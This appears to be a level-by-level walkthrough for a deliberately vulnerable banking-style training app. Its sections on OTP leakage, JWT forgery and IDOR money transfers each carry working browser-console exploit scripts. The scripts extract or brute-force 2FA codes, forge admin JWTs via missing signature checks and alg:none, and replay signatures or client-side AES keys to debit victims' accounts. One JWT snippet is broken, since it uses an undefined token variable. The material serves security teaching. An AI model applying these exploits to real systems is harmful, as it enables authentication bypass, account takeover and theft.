L11
OTP in response body
CWE-200 · A04
Goal: recover the 2FA OTP from the client, not the victim's phone.
L0 — Fully vulnerableThe login OTP is injected into the dynamically-served script /public/js/otp-validation.js (the SESSION_DATA object). At L0 the plaintext OTP sits in _otp and the plaintext flag in _flag — everything is exposed.Read it: DevTools → Network/Sources → otp-validation.js → read the plaintext _otp and the plaintext flag in _flag.
Console exploit
(async () => {
  const js = await (await fetch('/public/js/otp-validation.js')).text();
  const d = JSON.parse(js.match(/SESSION_INJECT_START\*\/\s*(\{.*?\})\s*\/\*SESSION_INJECT_END/s)[1]);
  console.log('OTP =', d._otp, '  Flag =', d._flag);
})();
✓ verified		Submit valid credentials → on the OTP screen open DevTools → Sources/Network → otp-validation.js, or run the console snippet./login
L1 — Predictable from seed+uidNo plaintext OTP — the OTP token's id leaks as _seed and the user id as _uid; the OTP is parseInt(sha256(seed·uid)[:8], 16) % 10000 (first 8 hex of the hash as an integer, last 4 digits; inputs concatenated as decimal strings). In CTF the _algo field states this.Recompute the OTP from _seed+_uid (concatenate as strings, not numbers), then decrypt the sealed flag (_flag_enc = flag XOR sha256(OTP)).
Console exploit
(async () => {
  const js = await (await fetch('/public/js/otp-validation.js')).text();
  const d = JSON.parse(js.match(/SESSION_INJECT_START\*\/\s*(\{.*?\})\s*\/\*SESSION_INJECT_END/s)[1]);
  const msg = String(d._seed) + String(d._uid); // string concat (NOT numeric addition)
  const hex = [...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(msg)))].map(b => b.toString(16).padStart(2, '0')).join('');
  const otp = String(parseInt(hex.slice(0, 8), 16) % 10000).padStart(4, '0'); // first 8 hex -> int -> last 4 digits
  const key = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(otp)));
  const ct = Uint8Array.from(atob(d._flag_enc), c => c.charCodeAt(0));
  console.log('OTP =', otp, '  Flag =', String.fromCharCode(...ct.map((b, i) => b ^ key[i % 32])));
})();
✓ verified
L2 — Secrets in response headersNothing sensitive in the JS body — the OTP hash (X-Otp-Check = sha256(otp)) and the sealed flag (X-Flag-Enc) ship in the response headers of otp-validation.js. The body carries only breadcrumbs (_algo/_flag_algo) pointing at the headers.Read the response headers (Network tab) → brute-force the 10,000-value space against X-Otp-Check, then decrypt the sealed X-Flag-Enc with the recovered OTP.
Console exploit
(async () => {
  const res = await fetch('/public/js/otp-validation.js');
  const otpCheck = res.headers.get('X-Otp-Check');   // sha256(otp), from the response header
  const flagEnc  = res.headers.get('X-Flag-Enc');    // sealed flag, from the response header
  const enc = new TextEncoder();
  let otp;
  for (let i = 0; i < 10000; i++) {
    const g = String(i).padStart(4, '0');
    const h = [...new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(g)))].map(x => x.toString(16).padStart(2, '0')).join('');
    if (h === otpCheck) { otp = g; break; }
  }
  const key = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(otp)));
  const ct = Uint8Array.from(atob(flagEnc), c => c.charCodeAt(0));
  console.log('OTP =', otp, '  Flag =', String.fromCharCode(...ct.map((b, i) => b ^ key[i])));
})();
✓ verified
L3 — Secure↑ nothing OTP-related is injected into the script.Secure — no recovery: the OTP never reaches the client; verification is server-side only, so there's nothing to read, recompute or crack. ✓ verified
3 of 8 AUTH  ·  L12 — JWT (forge → access) CWE-347 · A02  ·  /login · /dashboard
L12
JWT (forge → access)
CWE-347 · A02
Goal: forge a token for role:admin without the key.
L0 — Signature not verifiedThe app trusts a JWT from the browser-readable access_token cookie (or Authorization: Bearer). The verifier only checks that a signature segment exists — it never verifies the HMAC.Tamper freely: set the payload to {"sub":"ADMIN001","role":"admin",…} and leave any signature string in place → accepted as admin.
Console exploit
(() => {
  const b64 = o => btoa(JSON.stringify(o)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  const now = Math.floor(Date.now()/1000);
  const claims = {sub:'ADMIN001', role:'admin', iat:now, exp:now+3600};
  const t = b64({alg:'HS256',typ:'JWT'}) + '.' + b64(claims) + '.anything'; // sig present, never verified
  document.cookie = 'access_token=' + t + '; path=/';
  console.log('forged L0 token set — reload the page');
})();
✓ verified		Log in → the JWT is in the access_token cookie. Forge it in the console, then reload (the JWT path wins even with a session)./login · /dashboard
L1 — alg:none acceptedKeeping the old signature now fails (the HMAC is checked) — but the verifier still accepts unsigned tokens when alg is none.Drop the signature: header {"alg":"none"}, admin payload, empty signature.
Console exploit
(() => {
  const b64 = o => btoa(JSON.stringify(o)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  const now = Math.floor(Date.now()/1000);
  const claims = {sub:'ADMIN001', role:'admin', iat:now, exp:now+3600};

  document.cookie = 'access_token=' + t + '; path=/';
  console.log('forged L1 (alg:none) token set — reload the page');
})();
✓ verified
L2 — case-sensitive alg checkPlain alg:none is rejected now — but only the exact lowercase none is blocked; a differently-cased value slips through to the unsigned-accept path.Bypass the case check: use {"alg":"None"} (or NONE) with an empty signature.

4 of 8 TRANSFER  ·  L1 — IDOR — transfer from another account CWE-639 · A01  ·  /transfer (& /statements)
L1
IDOR — transfer from another account
CWE-639 · A01
L0 — Fully vulnerableThe From account is posted as from_account_ref; at L0 that value is simply the raw account number and the server debits it with no ownership check.Bypass: in DevTools edit a <select name="from_account_ref"> option value to a victim's number (e.g. 50100100000002) and finish the wizard → their account is drained, flag delivered. The same id is also readable unscoped via /statements?account_id=N. ✓ verifiedTransfer → start a transfer, then in DevTools change the from_account_ref value (replay a number+signature pair from the payee JS at L1, read transfer-ref.js for the AES key at L2)./transfer (& /statements)
L1 — Number + HMAC signature↑ the form submits the plain number and its signature (from_account_ref + from_account_sig); the server verifies hmac(number)==sig in O(1) (no table scan). Editing only the number leaves the signature empty, so it's rejected.Bypass (leaked pair): watch the Network request — from_account_ref=<number> + from_account_sig=<64-hex>. Search the page JS: srcSig maps your accounts, and a separate dstSig/payee map leaks valid number→signature pairs for accounts you don't own. Replay a victim's number with ITS signature → flag. Signatures can't be forged (secret is server-side), only reused. ✓ verified
L2 — Client-side encryption↑ the dropdown shows plain numbers, but a page script encrypts your selected account with XferRef.encryptRef() into the hidden from_account_ref — so the request carries AES ciphertext. Editing the <select> to a victim's number isn't on the page's own-account allowlist, so from_account_ref posts empty and is rejected.Bypass (key in JS): watch the Network request — from_account_ref is AES ciphertext (base64). /public/vendor/transfer-ref.js ships the AES key, IV and algorithm (plus XferRef.encryptRef()/decryptRef()). Confirm the scheme: run XferRef.decryptRef('<the from_account_ref value from the request>') — it returns your own account number, proving the field is just the encrypted number. Then forge: XferRef.encryptRef('50100100000002'), set the hidden #fromRef to the result, submit → flag. Client-side crypto is obscurity, not security. ✓ verified
L3 — Secure↑ sameSecure — no bypass: the execute path scopes the source account with WHERE id = :id AND user_id = :current, so every forged number/token/handle is rejected. ✓ verified
